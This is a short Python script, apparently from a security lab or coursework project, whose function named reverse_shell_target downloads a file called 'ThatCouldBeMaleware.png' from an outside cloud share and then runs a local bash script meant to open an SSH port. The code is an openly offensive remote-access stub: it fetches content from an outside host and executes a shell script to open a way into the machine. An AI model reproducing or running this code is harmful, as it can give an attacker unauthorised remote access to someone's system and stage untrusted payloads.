import requests
import subprocess

def reverse_shell_target():

    url =  "https://tubcloud.tu-berlin.de/s/FNmHMXp3zWiMggb/download/ThatCouldBeMaleware.png"

    filename = "ThatCouldBeMaleware.png"

    response = requests.get(url)

    if response.status_code == 200:
        with open(filename, "wb") as f:
            f.write(response.content)
            open_temp_ssh()
    else:
        print("Download failed! {response.status_code}")

def open_temp_ssh():
    path = "./open_ssh_temp.sh"

    try:
        subprocess.run(["bash", path], check = True )
    except subprocess.CalledProcessError:
        print(f"SSH port can not open!")


